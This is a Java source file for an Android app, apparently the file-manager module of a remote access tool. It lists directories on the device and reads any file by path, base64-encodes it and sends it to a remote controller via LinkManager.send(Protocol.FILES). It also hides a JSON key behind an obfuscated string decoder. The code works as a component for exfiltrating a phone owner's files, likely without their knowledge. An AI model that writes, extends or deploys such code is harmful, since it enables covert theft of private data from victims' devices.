package com.piupiupiu;

import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;


/**
 * Created by piupiupiu on 10/23/16.
 */

public class FileManager {


    public static JSONArray walk(String path){


        // Read all files sorted into the values-array
        JSONArray values = new JSONArray();
        File dir = new File(path);

        // 始终先放「上一级」入口，保证目录不可读时仍能向上导航（Android 11+ 作用域存储下很常见）。
        File parent = dir.getParentFile();
        if (parent != null) {
            try {
                JSONObject parenttObj = new JSONObject();
                parenttObj.put("name", "../");
                parenttObj.put("isDir", true);
                parenttObj.put(StrCodec.dec("FiA="), parent.getAbsolutePath());
                values.put(parenttObj);
            } catch (JSONException ignore) {}
        }

        File[] list = dir.listFiles();
        if (list != null) {
            for (File file : list) {
                if (!file.getName().startsWith(".")) {
                    try {
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", file.getName());
                        fileObj.put("isDir", file.isDirectory());
                        fileObj.put(StrCodec.dec("FiA="), file.getAbsolutePath());
                        values.put(fileObj);
                    } catch (JSONException ignore) {}
                }
            }
        } else {
            Log.d("filemgr", "inaccessible: " + path);
        }

        return values;
    }

    public static void downloadFile(String path){
        if (path == null)
            return;

        File file = new File(path);

        if (file.exists()){

            int size = (int) file.length();
            byte[] data = new byte[size];
            try {
                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                buf.read(data, 0, data.length);
                JSONObject object = new JSONObject();
                object.put("file",true);
                object.put("name",file.getName());
                object.put("buffer" , Base64.encodeToString(data, Base64.DEFAULT));
                LinkManager.getInstance().send(Protocol.FILES , object);
                buf.close();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }


        }
    }

}
